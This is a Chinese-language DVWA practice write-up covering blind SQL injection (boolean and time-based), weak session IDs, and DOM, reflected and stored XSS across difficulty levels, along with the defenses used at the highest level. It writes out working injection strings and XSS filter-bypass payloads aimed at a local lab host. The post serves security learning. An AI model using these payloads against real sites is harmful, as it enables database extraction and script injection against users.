上篇介绍Insecure CAPTCHE和SQL Injection，该篇继续SQLInjection（Blind）、Weak Session
IDs、XSS（DOM）和XSS（Stored）。  

  

## SQL Injection（Blind）

SQL盲注与一般注入的区别主要是，一般的注入会显示注入语句的结果，但是盲注时攻击者无法从显示页面上获取执行结果，甚至连注入语句是否执行都不知道，一般来说盲注的结果只有是或者不是。盲注一般有机遇布尔的盲注，基于时间的盲注以及基于报错的盲注。

### 10.1 Low等级

10.1.1 漏洞分析

设置为Low等级，源码如下，这里id没有任何过滤，返回结果根据返回数量只有存在和不存在两种。

![image.png](https://image.3001.net/images/20200326/1585228850_5e7cac32282ec.png!small)

  

10.1.2 基于布尔的盲注

判断是否存在注入，输入1返回存在。之后输入1' and 1=1 #和1' and 1=2
#，分别得到如下结果，当and后面为假（1=2）时候不存在，为真（1=1）的时候存在，说明存在字符型注入。而且我们可以通过and后门加语句来判断语句的真假，如果存在则真，如果不存在则假。

然后猜测当前数据库名长度，分别输入

1' andlength(database())=1 #

1' andlength(database())=2 #

1' andlength(database())=3 #

1' andlength(database())=4 #

1' andlength(database())=5 #

我们知道1肯定存在，所以只有当数据库长度猜测正确时候，才会返回存在。实验发现输入1' and length(database())=4
#时候显示存在，则数据库长度为4。

之后我们猜测每个位置上的字母，使用二分法来猜测四个字母。

这里认为是小写a（97）-z（122）之间，所以输入如下，其中substr(str,pos,len)截取第pos位置的长度为len的字符，这里的原理是不断的猜测字母的区间，如果结果显示存在则猜测正确，如果显示不存在则猜测错误。

1' andascii(substr(database(),1,1))>97 #

1' andascii(substr(database(),1,1))<122 #

1' andascii(substr(database(),1,1))>110 #

1' andascii(substr(database(),1,1))>103 #

1' andascii(substr(database(),1,1))>100 #

1' andascii(substr(database(),1,1))>99 #

根据上述结果得出大于99存在，大于100不存在，所以可以确定第一个字符的ascii码为100，即database()第一个字符为d。

其他的只要将ascii(substr(database(),1,1))换成ascii(substr(database(),2,1))、ascii(substr(database(),3,1))、ascii(substr(database(),4,1))重复上述步骤即可。

之后猜测数据库中表的数量，使用如下命令进行猜测，同样根据返回是否存在来判断真假。

1' and(select count(table_name) from information_schema.tables
wheretable_schema=database())=1 #

1' and(select count(table_name) from information_schema.tables
wheretable_schema=database())=2 #

当猜测为2的时候存在，所以有两个表。

这里开始猜测第一个表的长度，这里使用substr(str,pos)表示从第pos个位置开始截取到最后，pos开始是1，limit
n,m返回查询数据的第n+1到m+1行，所以这里我们使用select table_name frominformation_schema.tables
where table_schema=database() limit
0,1表示查询结果的第一行也就是第一个表格名称，然后利用substr(str,1)表示

1' andlength(substr((select table_name from information_schema.tables
wheretable_schema=database() limit 0,1),1))=1 #

1' andlength(substr((select table_name from information_schema.tables
wheretable_schema=database() limit 0,1),1))=2 #

…

1' andlength(substr((select table_name from information_schema.tables
wheretable_schema=database() limit 0,1),1))=9 #

这里可以利用Intruder模块来进行模拟更加快捷，当为9的时候显示存在，说明第一个表格的名称长度是9。

下面对每个字符进行猜测，像猜测表名一样，这里使用另外一种方式，就是Intruder的方式，首先截取如下命令的请求，并发送到Intruder，设置payload位置为a

1' andascii(substr((select table_name from information_schema.tables
wheretable_schema=database() limit 0,1),1,1))=ascii('a') #

![image.png](https://image.3001.net/images/20200326/1585228867_5e7cac4351994.png!small)

而后选择payload为小写字母，如图

![image.png](https://image.3001.net/images/20200326/1585228872_5e7cac487ac6a.png!small)

点击Start attack返回结果，结果如图，发现g的返回值和别的返回值长度不同，所以g是第一个字符的值。

![image.png](https://image.3001.net/images/20200326/1585228882_5e7cac52390ed.png!small)

以此类推可以猜测其他位置的字符。

同时使用如下命令并重复操作

selecttable_name from information_schema.tables where table_schema=database()
limit1,2

可以猜测另外一个表的字符名称，这里不再累述。

接下来猜测users表的字段数量，使用如下命令进行

1' and(select count(column_name) from information_schema.columns where
table_name='users')=1 #

1' and(select count(column_name) from information_schema.columns where
table_name='users')=2 #

…

1' and(select count(column_name) from information_schema.columns
wheretable_name='users')=11 #

直到11显示存在，所以有11个字段，然后猜测每个字段的长度使用如下命令

1' andlength(substr((select column_name from information_schema.columns
wheretable_name='users' limit 0,1),1))=1 #

猜测出长度以后使用二分法或者Intruder去得出结果，使用如下命令

1' andascii(substr((select column_name from information_schema.columns
wheretable_name='users' limit 0,1),1,1))>97 #

这样就可以猜测出字段数，至于数据的猜测也是使用上述方式，首先猜测字段长度，然后猜测字段的字符。

10.1.3 基于时间的盲注

除了使用基于布尔的盲注，也可以使用基于时间的盲注即sleep()函数，在执行成功后会发生延时。

为了发现存在的注入类型，分别输入1 and sleep(5) #和1' and sleep(5) #，发现当输入1' and sleep(5)
#时候有明显延迟，如下图所示，所以有字符型注入。

![image.png](https://image.3001.net/images/20200326/1585228902_5e7cac66362da.png!small)

为了验证数据库名字长度可以使用如下输入，其中使用的if(ex1,ex2,wx3)是表示如果ex1为真，则执行ex2，如果ex1为假，则执行ex3。

1' andif(length(database())=1,sleep(5),1) #

1' andif(length(database())=2,sleep(5),1) #

1' andif(length(database())=3,sleep(5),1) #

1' andif(length(database())=4,sleep(5),1) #

当为4的时候发现有明显的延迟，所以数据库名称长度为4。

之后按如下格式输入，用二分法猜测字符

1' andif((ascii(substr(database(),1,1))>97),sleep(5),1) #

这里只给出示例代码，后续操作不再累述。

在知道数据库名称之后，猜测表的个数，使用如下格式输入

1' andif((select count(table_name) from information_schema.tables
wheretable_schema=database())=1,sleep(5),1) #

在得到表单数量可以使用如下格式猜测第一个表单长度

1' andif(length(substr((select table_name from information_schema.tables
wheretable_schema=database() limit 0,1),1))=1,sleep(5),1) #

之后猜测表单的字符值，使用如下格式

1' andif(ascii(substr((select table_name from information_schema.tables
wheretable_schema=database() limit 0,1),1,1))>97,sleep(5),1) #

之后猜测users表单的字段数，使用如下格式

1' andif((select count(column_name) from information_schema.columns
wheretable_name='users')=1,sleep(5),1) #

猜测出字段数，猜测每个字段数的长度，使用如下格式

1' and if(length(substr((select column_name frominformation_schema.columns
where table_name='users' limit0,1),1))=1,sleep(5),1) #

猜测每个字段的字符值，使用如下个格式

1' andif(ascii(substr((select column_name from information_schema.columns
wheretable_name='users' limit 0,1),1,1))>97,sleep(5),1) #

之后猜测user字段的数据数量，然后对每个数据的长度进行猜测，然后猜测字符值即可完成。

### 10.2 Medium等级

10.2.1 漏洞分析

设置为Medium等级，源码改动如下，使用了mysqli_real_escape_string函数对特殊符号进行转义，并且使用了下拉列表来防止输入。

![image.png](https://image.3001.net/images/20200326/1585228918_5e7cac762d8b9.png!small)

10.2.2 基于布尔的盲注

这里判断发现是属于字符型的盲注，所以转义函数对sql注入影响不大，只是在输入table_name='users'这里有影响，将它写成table_name=0x7573657273即可。这里演示几个格式。将截取的id参数修改如下

1 andlength(database())=1 #

1 and(select count(column_name) from information_schema.columns where
table_name=0x7573657273)=1#

10.2.3 基于时间的盲注

基于时间的盲注和基于布尔的相似，这里也演示几个格式，同样似乎截取请求修改id

1 andif(length(database())=1,sleep(5),1) #

1 andif((select count(column_name) from information_schema.columns
wheretable_name=0x7573657273)=1,sleep(5),1) #

### 10.3 High等级

10.3.1 漏洞分析

设置为High等级，源码更改如下，这里使用LIMIT
1限制输入，同时如果无返回值会sleep若干秒，所以对基于时间的盲注会造成影响，同时请求页面和响应页面不同，也不会发生跳转。

![image.png](https://image.3001.net/images/20200326/1585228928_5e7cac805f826.png!small)

10.3.2 基于布尔的盲注

这里虽然添加了LIMIT
1，但是我们可以是用#将其注释掉即可，所有注入的格式同Low等级一致，但是这里由于无返回值的时候，系统会使用sleep随机执行几秒钟，所以基于时间的盲注就会受到影响，这里只使用基于布尔的盲注来进行复现。

### 10.4 Impossible等级

设置为Impossible等级，源码如下，使用了Anti-CSRF防止CSRF攻击，使用PDO将输入和语句分开，避免SQL注入。

![image.png](https://image.3001.net/images/20200326/1585228957_5e7cac9db3592.png!small)

## Weak Session IDs

一个会话ID的内容往往需要在登录后作为访问网页的唯一标识，如果会话ID能够计算或者容易被猜到，那么攻击者就不用暴力破解密码或者寻找其他类似CSRF的漏洞来进行登录，直接猜测会话ID即可登录。这里可以使用Burp的Sequencer来进行验证随机性。

### 11.1 Low等级

设置为Low等级，源码如下，可以发现dvwaSession是上次dvwaSession加1，这样子的设置，只要攻击者直接从1开始尝试，即可完成爆破，十分的不安全。

![image.png](https://image.3001.net/images/20200326/1585228965_5e7caca5bf51f.png!small)

这里是截取的值，如图所示

![image.png](https://image.3001.net/images/20200326/1585228972_5e7cacac1e8dc.png!small)

### 11.2 Medium等级

设置为Medium等级，源码如下，time()是返回自Unix纪元（January 1 1970 00:00:00
GMT）起的当前时间的秒数，如果攻击尝试这个机制的SessionID设置，也会造成SessionID的获取。

![image.png](https://image.3001.net/images/20200326/1585229021_5e7cacdd7f37d.png!small)

这里是截取的值如图所示

![image.png](https://image.3001.net/images/20200326/1585229027_5e7cace3ad1c2.png!small)

### 11.3 High等级

设置为High等级，源码如下，这里设置上次的Session
ID加1并用md5处理，这样的机制就不容易被猜测到，虽然该机制方式较简单，但是生成的SessionID随机性比较好，如果在不了解机制情况下很难猜测出。

![image.png](https://image.3001.net/images/20200326/1585229037_5e7caced50e4a.png!small)

### 11.4 Impossible等级

设置为Impossible等级，源码如下，这里对时间和随机数还有字符组合并进行sha1运算，具有很强的随机性，也很难猜测，即使知道机制也无法复现。

![image.png](https://image.3001.net/images/20200326/1585229043_5e7cacf3539d4.png!small)

## XSS（DOM）

XSS称为跨站脚本攻击，全称Cross Site
Scripting，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在浏览器上执行。DOM型XSS通过如下方式执行，用户请求一个专门设计过的URL，它由攻击者提交，且其中包含嵌入式的JavaScript，服务器的响应中并不以任何形式包含攻击者的脚本，只是回应含有硬编码的JavaScript页面，当用户的浏览器处理这个响应时候，上述脚本得以执行。因为客户端JavaScript可以访问DOM并对它进行操作，这样就可以决定用于加载的URL，当应用程序本身的脚本可以从URL提取数据，并对数据进行处理时，就有可能通过构造URL来让应用程序访问DOM提取URL地址，从而受到DOM型XSS攻击。

这里分析DVWA所给的示例，本意是选取下拉列表的值，然后执行服务器返回的JavaScript脚本，该脚本可以操作DOM，让选择的值用document.write显示在下拉列表中。当我们修改URL后的default值时候，有下面源码给出，这是客户端只要发送请求，服务器就会返回如下的脚本，这些脚本的执行在客户端，是通过操作DOM来实现的，这段代码本身是固定的，即服务器会根据安全等级返回固定的页面（由require_once实现），而页面的执行是在浏览器端，在执行脚本时会操作DOM，从URL中提取数据并显示，而安全等级不同对提取的数据处理不同，所以受到XSS攻击的风险就不同。如果XSS攻击存在，它属于脚本操作DOM所造成的，所以判断为DOM型XSS。

![image.png](https://image.3001.net/images/20200326/1585229056_5e7cad005e290.png!small)

### 12.1 Low等级

12.1.1 漏洞分析

设置为Low等级，源码如下，这里返回的脚本中，不对defaultd的值做任何限制，任何合法输入都可以被执行。

![image.png](https://image.3001.net/images/20200326/1585229069_5e7cad0d3fe68.png!small)

12.2.2 直接输入script脚本运行

document.write(ex1,ex2,ex3)会把读到的语句在html上输出HTML，本意是将url后的数值在下拉框中显示，这里使用<optionvalue="2">\+
"ex2"
+</option>来实现，比如输入的是1，就会显示2在下拉框，1输出在html内。但是当我们截断请求修改url时候，输入js脚本时候，document.write会把$decodeURI(lang)执行，从而弹窗。

这里构造如下url

[http://172.10.172.3/dvwa/vulnerabilities/xss_d/?default=<script>alert('/xss/')</script>](http://172.10.172.3/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert\(%27/xss/%27\)%3C/script)

结果发生弹窗，结果如下。

![image.png](https://image.3001.net/images/20200326/1585229085_5e7cad1d351de.png!small)

### 12.2 Medium等级

12.2.1 漏洞分析

设置为Medium等级，源码如下，这里stripos是指查找default中<script字段，如果有则返回出现的位置，如果没有则返回false，如果存在则网页返回header，制定default=English。

![image.png](https://image.3001.net/images/20200326/1585229097_5e7cad293f9e4.png!small)

12.2.2 利用其他关键词进行弹窗

因为会过滤掉<script>，所以可以使用<img src='x'
onerror='alert('/xss/')'>来实现，但是在<select>中不能添加img，所以要先闭合掉</select>就可以完成弹窗。设置url如下

[http://172.10.172.3/dvwa/vulnerabilities/xss_d/?default=</select><imgsrc='x'
onerror='alert(/xss/)'>](http://172.10.172.3/dvwa/vulnerabilities/xss_d/?default=%3C/select%3E%3Cimg%20src=%27x%27%20onerror=%27alert\(/xss/\)%27%3E)

结果如下

![image.png](https://image.3001.net/images/20200326/1585229104_5e7cad3065576.png!small)

### 12.3 High等级

12.3.1 漏洞分析

设置为High等级，源码如下，设置了只有四种可以选择，如果不是四种之内的内容就会返回English。

![image.png](https://image.3001.net/images/20200326/1585229110_5e7cad3682103.png!small)

12.3.2 利用#特性绕过

因为在url中#之后的值不会传给服务器，所以在#加入JavaScript代码就不会被服务器检测出来，使用如下url

<http://172.10.172.3/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert('/xss/')%3C/script%3E>

结果如下

![image.png](https://image.3001.net/images/20200326/1585229123_5e7cad4346066.png!small)

## XSS（Reflected）

反射型XSS是没有存储在服务器中，只有诱导用户点击url后，会在返回的页面中执行脚本，从而受到攻击

### 13.1 Low等级

13.1.1 漏洞分析

设置为Low，源码如下，输入的name直接在页面显示出来。

![image.png](https://image.3001.net/images/20200326/1585229157_5e7cad650d5d0.png!small)

13.1.2 直接执行script弹窗

这里直接输入<script>alert('/xss/')</script>，即构造如下url

[http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27/xss/%27)%3C/script%3E#](http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert\(%27/xss/%27\)%3C/script%3E)

结果如下

![image.png](https://image.3001.net/images/20200326/1585229183_5e7cad7fa8a2a.png!small)

### 13.2 Medium等级

13.2.1 漏洞分析

设置为Medium等级，源码如下，这里对<script>转换成空字符实现了一些限制。

![image.png](https://image.3001.net/images/20200326/1585229190_5e7cad865862f.png!small)

13.2.2 利用双写黑名单字符绕过

这里将<script>用<scr<script>ipt>代替，从而实现绕过，url构造如下

[http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert(%27/xss/%27)%3C/script%3E#](http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert\(%27/xss/%27\)%3C/script%3E)

结果如下

![image.png](https://image.3001.net/images/20200326/1585229200_5e7cad90ac029.png!small)

13.2.3 利用大小写绕过

因为str_replace区分大小写，所以使用<ScrIPt>来代替<script>即可实现绕过，url构造如下

[http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3CScrIPt%3Ealert(%27/xss/%27)%3C/script%3E#](http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3CScrIPt%3Ealert\(%27/xss/%27\)%3C/script%3E)

结果如下

![image.png](https://image.3001.net/images/20200326/1585229209_5e7cad99484a8.png!small)

### 13.3 High等级

13.3.1 漏洞分析

设置为High等级，源码改动如下，这里使用黑名单，通过正则来进行限制，可以防止双写绕过和大小写绕过。

![image.png](https://image.3001.net/images/20200326/1585229222_5e7cada6f2627.png!small)

13.3.2 使用img来进行弹窗

选择<img src=1 onerror=alert('/xss/')>来进行弹窗测试，url构造如下

[http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src=1%20onerror=alert(%27/xss/%27)%3E#](http://172.10.172.3/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src=1%20onerror=alert\(%27/xss/%27\)%3E)

结果如下

![image.png](https://image.3001.net/images/20200326/1585229229_5e7cadadbbd6b.png!small)

### 13.4 Impossible等级

设置为Impossible等级，源码如下，htmlspecialchars将输入的代码转换成HTML实体，防止浏览器将其作为HTML元素

![image.png](https://image.3001.net/images/20200326/1585229293_5e7caded8ced7.png!small)  

## XSS（Stored）

存储型XSS是将恶意代码存储到服务器中，当用户点击该页面时候，会受到攻击

### 14.1 Low等级

14.1.1 漏洞分析

设置为Low等级，源码如下，trim()是指移除字符两边的空白字符和一些特定字符，mysqli_real_escape_string对一些sql语句中的特殊字符进行转义，stripslashes()是删除字符串中的反斜杠，对于XSS方面没有进行任何过滤，而且存储在数据库中，所以存在明显的存储型XSS漏洞。

![image.png](https://image.3001.net/images/20200326/1585229304_5e7cadf869217.png!small)

14.1.2 message字段直接输如常规弹窗字符

在message出输入<script>alert(/xss/)</script>，提交后访问页面发生弹窗，输入和结果如下

![image.png](https://image.3001.net/images/20200326/1585229316_5e7cae043fa55.png!small)![image.png](https://image.3001.net/images/20200326/1585229320_5e7cae088a49a.png!small)

  

14.1.3 Burp拦截修改name字段实现弹窗

这里name的输入有长度限制，我们可以利用Burp截取，然后修改name为<script>alert(/xss/)</script>，截取和结果如下

![image.png](https://image.3001.net/images/20200326/1585229333_5e7cae1597eb8.png!small)

![image.png](https://image.3001.net/images/20200326/1585229340_5e7cae1cbb361.png!small)

### 14.2 Medium等级

14.2.1 漏洞分析

设置为Medium等级，源码如下，这里addslashes对单引号等添加反斜杠，strip_tags去除HTML、XML以及PHP标签，htmlspecialchars将message转义为html实体，不能执行脚本，message无法执行实现XSS攻击。但是name只是简单的对<script>进行黑名单过滤，可以绕过

![image.png](https://image.3001.net/images/20200326/1585229350_5e7cae264e625.png!small)

14.2.2 双写黑名单字符绕过name限制

使用Burp拦截请求，将name中的<script>用<scr<script>ipt>替换，拦截修改和结果如下

![image.png](https://image.3001.net/images/20200326/1585229355_5e7cae2be21f0.png!small)

![image.png](https://image.3001.net/images/20200326/1585229363_5e7cae336d8ce.png!small)  

14.2.3 混淆大小写绕过

使用Burp拦截请求，修改name，用<SCRipt>替换<script>，修改截图和结果如下

![image.png](https://image.3001.net/images/20200326/1585229375_5e7cae3fa3acc.png!small)

![image.png](https://image.3001.net/images/20200326/1585229384_5e7cae4821127.png!small)  

### 14.3 High等级

14.3.1 漏洞分析

设置为High等级，源码修改如下，对name使用正则来进行黑名单过滤，防止了一部分攻击无法进行。

![image.png](https://image.3001.net/images/20200326/1585229490_5e7caeb202e24.png!small)

14.3.2 利用img标签来进行弹窗

Burp截取请求，将name修改为<img src=1onerror=alert(/xss/)>，修改请求和结果如下

![image.png](https://image.3001.net/images/20200326/1585229496_5e7caeb8246f4.png!small)

![image.png](https://image.3001.net/images/20200326/1585229502_5e7caebec93fc.png!small)  

### 14.4 Impossible等级

设置为Impossible等级，源码改动如下，这里将message和name都进行了过滤标签，转义，使用htmlspecialchars转换成html实体，从而防止了XSS攻击。

![image.png](https://image.3001.net/images/20200326/1585229515_5e7caecb78a76.png!small)

## 小结

DVWA的靶机练习到此结束，通过查看php源码，更加了解了攻击手段以及防御手段，本质上来说，如果是要绝对安全，最好设置白名单，参数化这样可以防止各种绕过。在CSRF的高等级获取token，Weak
Session IDs的复现以及DOM型XSS的php代码和XSS漏洞利用仍然存在一定问题。在今后工作中再进一步理解分析。

* * *

DVWA今天完结了，边上传边看，还是可以看到实习时期的不足和经验缺失，实践总是可以迅速成长的，DVWA只是小小的起点，如果有萌新看到这里，非常想说的是：

永远怀疑，不断试错。

你会走的更远。

共勉

  

期待后续新的内容

  

-2020/3/26

  

